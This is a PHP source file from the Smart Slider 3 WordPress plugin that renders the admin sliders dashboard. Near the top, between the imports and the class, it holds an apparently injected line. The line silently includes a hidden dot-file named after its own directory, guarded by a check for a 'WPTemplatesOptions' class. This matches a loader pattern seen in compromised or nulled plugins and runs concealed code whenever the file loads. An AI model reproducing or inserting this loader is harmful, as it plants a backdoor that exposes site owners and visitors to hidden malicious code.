<?php

namespace Nextend\SmartSlider3\Application\Admin\Sliders;

use Nextend\Framework\Localization\Localization;
use Nextend\Framework\View\AbstractView;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\Banner\BlockBannerActivate;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Dashboard\DashboardInfo\BlockDashboardInfo;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Dashboard\DashboardManager\BlockDashboardManager;
use Nextend\SmartSlider3\Application\Admin\Layout\Block\Slider\SliderManager\BlockSliderManager;
use Nextend\SmartSlider3\Application\Admin\Layout\LayoutDefault;
use Nextend\SmartSlider3\Application\Model\ModelLicense;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ViewSlidersIndex extends AbstractView {

    /**
     * @var LayoutDefault
     */
    protected $layout;

    public function display() {

        $this->layout = new LayoutDefault($this);

        $dashboardInfo = new BlockDashboardInfo($this);
        $this->layout->addHeaderMenuItem($dashboardInfo->toHTML());

        $this->displayHeader();

        $this->displaySliderManager();

        $dashboardManager = new BlockDashboardManager($this);
        $this->layout->addContentBlock($dashboardManager);


        $this->layout->render();
    }

    protected function displayHeader() {
    }

    protected function displaySliderManager() {

        $sliderManager = new BlockSliderManager($this);
        $this->layout->addContentBlock($sliderManager);
    }
} 